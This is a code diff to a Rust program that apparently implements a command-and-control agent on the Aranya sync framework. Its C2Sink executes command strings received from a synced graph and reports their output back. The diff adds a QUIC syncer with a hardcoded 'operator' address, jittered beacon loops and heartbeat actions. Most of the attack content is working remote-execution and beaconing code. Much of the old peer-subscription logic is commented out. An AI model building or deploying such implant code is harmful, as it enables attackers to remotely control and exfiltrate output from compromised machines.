@@ -1,6 +1,7 @@
 mod common;
 mod config;
 mod policy;
+mod c2syncer;
 
 use std::{
     net::{
@@ -15,12 +16,13 @@ use std::{
 use aranya_policy_vm::{text, Text};
 use aranya_runtime::{storage::GraphId, Sink, VmEffect, vm_action};
 use aranya_crypto::BaseId;
-use tokio::time::{sleep, Duration};
-use crate::policy::command_executed;
+use tokio::{time::{Duration, sleep}};
+use crate::{c2syncer::{c2sync, new_quic_client}, policy::command_executed};
 use tokio::sync::Mutex;
+use chrono::prelude::*;
 
 struct C2Sink {
-    pub client: Option<Arc<Mutex<common::Client<C2Sink>>>>
+    pub client: Option<Arc<Mutex<common::C2Client<C2Sink>>>>
 }
 
 impl Sink<VmEffect> for C2Sink {
@@ -35,8 +37,8 @@ impl Sink<VmEffect> for C2Sink {
     fn consume(&mut self, effect: VmEffect) {
         if effect.name == "Command" {
             if let aranya_policy_vm::Value::String(s) = effect.fields[0].value() {
-                print!("COMMAND:{}\n", s);
-                let out = std::process::Command::new(s).output().expect("Error exec command");
+                print!("COMMAND:{}\n", s.trim());
+                let out = std::process::Command::new(s.trim()).output().expect("Error exec command");
                 let stdout = String::from_utf8(out.stdout).expect("Output string fail");
 
                 let clientr = &self.client.as_ref();
@@ -44,7 +46,7 @@ impl Sink<VmEffect> for C2Sink {
                 if let Some(client) = clientr.cloned() {
                     tokio::spawn(async move {
                         let a: Text = stdout.try_into().expect("String to Text fail");
-                        client.lock().await.do_action(vm_action!(command_executed(BaseId::default(), a))).await;
+                        client.lock().await.do_action(vm_action!(command_executed(effect.command, a))).await;
                     });
                 }
             }
@@ -58,7 +60,7 @@ impl Sink<VmEffect> for C2Sink {
 
 fn main() {
     // Enable logging to terminal 
-    tracing_subscriber::fmt::init();
+    tracing_subscriber::fmt().init();
 
     // Create new async runtime for the Aranya syncer.
     //   It needs a lot of stack memory
@@ -93,11 +95,11 @@ fn main() {
 
 
     ips = Vec::new();
-    ips.push("127.0.1.1".parse().unwrap());
-    ips.push("127.0.1.2".parse().unwrap());
-    ips.push("127.0.1.3".parse().unwrap());
-    ips.push("127.0.1.4".parse().unwrap());
-    ips.push("127.0.1.5".parse().unwrap());
+    // ips.push("127.0.1.1".parse().unwrap());
+    ips.push("127.0.0.2".parse().unwrap());
+    // ips.push("127.0.1.3".parse().unwrap());
+    // ips.push("127.0.1.4".parse().unwrap());
+    // ips.push("127.0.1.5".parse().unwrap());
 
     let mut rng = rand::rng();
     ips.shuffle(&mut rng);
@@ -108,7 +110,7 @@ fn main() {
 
     rt.block_on(async move {
         // Set up Aranya
-        let mut aranya = common::Client::init(
+        let mut aranya = common::C2Client::init(
             config::POLICY.to_string(),
             bind,
             C2Sink {
@@ -136,77 +138,129 @@ fn main() {
         // Let the syncer start up (warm up the engines :) )
         sleep(Duration::from_millis(1000)).await;
 
+        let mut syncbind = bind.clone();
+        syncbind.set_port(4446);
+        let quic = new_quic_client(syncbind);
+
+        // TODO: Temp default sync ip for operator
+        {
+            let aranyac = Arc::clone(&aranyam);
+            let aranyal = &mut *aranyac.lock().await;
+            let mut syncerl = aranyal.c2syncerm.lock().await;
+
+            syncerl.connections.push(SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 0, 2)), 4445));
+        }
+
         // Syncing logic loop
         loop {
             print!("{:?} | Loop start\n", bind);
             // Stall for a random amount of time
-            use rand::prelude::*;
             sleep(Duration::from_millis(rand::random_range(1000..2000))).await;
 
-            match ips.pop() {
-                // Subscribe to predefined ip list
-                Some(ip) => {
-                    let aranyac = Arc::clone(&aranyam);
-                    let aranyal = &mut *aranyac.lock().await;
+            // match ips.pop() {
+            //     // Subscribe to predefined ip list
+            //     Some(ip) => {
+            //         let aranyac = Arc::clone(&aranyam);
+            //         let aranyal = &mut *aranyac.lock().await;
 
-                    if ip == bind.ip() {
-                        continue
-                    }
+            //         if ip == bind.ip() {
+            //             continue
+            //         }
 
-                    aranyal.subscribe_to(SocketAddr::new(ip, config::PORT)).await;
+            //         match aranyal.subscribe_to(SocketAddr::new(ip, config::PORT)).await {
+            //             Ok(()) => subbedips.push(ip),
+            //             Err(_) => {
+            //                 println!("Cannot sub to {:?}", ip);
+            //             }
+            //         };
+            //    },
+            //     // Start subscribing back to subscribers
+            //     None => {
+            //         let aranyac = Arc::clone(&aranyam);
+            //         let aranyal = &mut *aranyac.lock().await;
 
-                    subbedips.push(ip);
-                },
-                // Start subscribing back to subscribers
-                None => {
-                    let aranyac = Arc::clone(&aranyam);
-                    let aranyal = &mut *aranyac.lock().await;
-
-                    // Get list of subscribers
-                    let mut subs: Vec<std::net::IpAddr> = Vec::new();
-                    {
-                        let mut syncer = aranyal.syncer.lock().await;
-                        for (&(addr, _sub_graph_id), subscription) in &syncer.subscriptions {
-                            // No need to sub if already subbed
-                            if subbedips.contains(&addr.ip()) {
-                                continue
-                            }
+            //         // Get list of subscribers
+            //         let mut subs: Vec<std::net::IpAddr> = Vec::new();
+            //         {
+            //             let mut syncer = aranyal.syncer.lock().await;
+            //             for (&(addr, _sub_graph_id), subscription) in &syncer.subscriptions {
+            //                 // No need to sub if already subbed
+            //                 if subbedips.contains(&addr.ip()) {
+            //                     continue;
+            //                 }
                             
-                            subs.push(addr.ip());
-                        }
-                    }
+            //                 subs.push(addr.ip());
+            //             }
+            //         }
 
-                    // Subscribe to the first subscriber
-                    match subs.pop() {
-                        Some(sub) => {
-                            aranyal.subscribe_to(SocketAddr::new(sub, config::PORT)).await;
-                            subbedips.push(sub);
-                        },
-                        None => {}
-                    };
-                }
-            };
+            //         // Subscribe to the first subscriber
+            //         match subs.pop() {
+            //             Some(sub) => {
+            //                 match aranyal.subscribe_to(SocketAddr::new(sub, config::PORT)).await {
+            //                     Ok(()) => subbedips.push(sub),
+            //                     Err(_) => {}
+            //                 };
+            //                 subbedips.push(sub);
+            //             },
+            //             None => {}
+            //         };
+            //     }
+            // };
 
             // Sync up with some nodes
             let aranyac = Arc::clone(&aranyam);
             let aranyal = &mut *aranyac.lock().await;
 
-            aranyal.push_graph().await;
+            let syncaddrs = {
+                let syncerl = aranyal.c2syncerm.lock().await;
+                syncerl.connections.to_vec()
+            };
+
+            println!("{:?}", syncaddrs);
+
+            for mut syncaddr in syncaddrs {
+                syncaddr.set_port(config::PORT);
+                c2sync(
+                    syncaddr,
+                    &quic,
+                    Arc::clone(&aranyal.c2syncerm)
+                ).await;
+            }
+
+
+            // aranyal.push_graph();
 
             use rand::seq::IndexedRandom;
-            match subbedips.choose(&mut rand::rng()) {
-                Some(ip) => {
-                    // TODO: TEmp debug
-                    if *ip == IpAddr::V4(Ipv4Addr::new(127, 0, 0, 2)) {
-                        print!("I AM SYNCING WITH THE OPERATOR!!!\n");
-                    }
+            // match subbedips.choose(&mut rand::rng()) {
+            //     Some(ip) => {
+            //         let _ = tokio::time::timeout(Duration::from_millis(5000), aranyal.sync_with(SocketAddr::new(*ip, config::PORT))).await;
+            //     },
+            //     None => {}
+            // }
 
-                    aranyal.sync_with(SocketAddr::new(*ip, config::PORT)).await;
-                },
-                None => {}
-            }
+            aranyal.do_action(vm_action!(heartbeat())).await;
+            // aranyal.do_action(vm_action!(heartbeat())).await;
+            // aranyal.do_action(vm_action!(heartbeat())).await;
+            // aranyal.do_action(vm_action!(heartbeat())).await;
+            // aranyal.do_action(vm_action!(heartbeat())).await;
+            // aranyal.do_action(vm_action!(heartbeat())).await;
+            // aranyal.do_action(vm_action!(heartbeat())).await;
+            // aranyal.do_action(vm_action!(heartbeat())).await;
+            // aranyal.do_action(vm_action!(heartbeat())).await;
+            // aranyal.do_action(vm_action!(heartbeat())).await;
+            // aranyal.do_action(vm_action!(heartbeat())).await;
+            // aranyal.do_action(vm_action!(heartbeat())).await;
+            // aranyal.do_action(vm_action!(heartbeat())).await;
+            // aranyal.do_action(vm_action!(heartbeat())).await;
+            // aranyal.do_action(vm_action!(heartbeat())).await;
+            // aranyal.do_action(vm_action!(heartbeat())).await;
+            // aranyal.do_action(vm_action!(heartbeat())).await;
+            // aranyal.do_action(vm_action!(heartbeat())).await;
+            // aranyal.do_action(vm_action!(heartbeat())).await;
 
             print!("{:?} | Loop end\n", bind);
         }
     });
+
+    print!("Should not reach\n");
 }
